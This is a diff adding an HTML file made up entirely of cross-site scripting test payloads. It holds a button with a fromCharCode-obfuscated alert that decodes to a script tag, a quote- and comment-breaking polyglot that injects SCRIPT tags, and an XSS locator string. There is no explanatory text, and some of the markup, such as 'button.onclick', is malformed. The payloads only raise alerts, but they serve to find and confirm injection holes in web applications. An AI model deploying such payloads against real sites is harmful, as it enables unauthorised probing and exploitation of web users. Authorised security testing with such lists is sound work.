@@ -1,0 +1,7 @@
+<html><body>
+<button.onclick="alert(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,
+101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1
+10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));">String:fr
+om.Char.Code</button></body></html>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//\";alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</SCRIPT>
+'';!--"<CrossSiteScripting>=&{()}
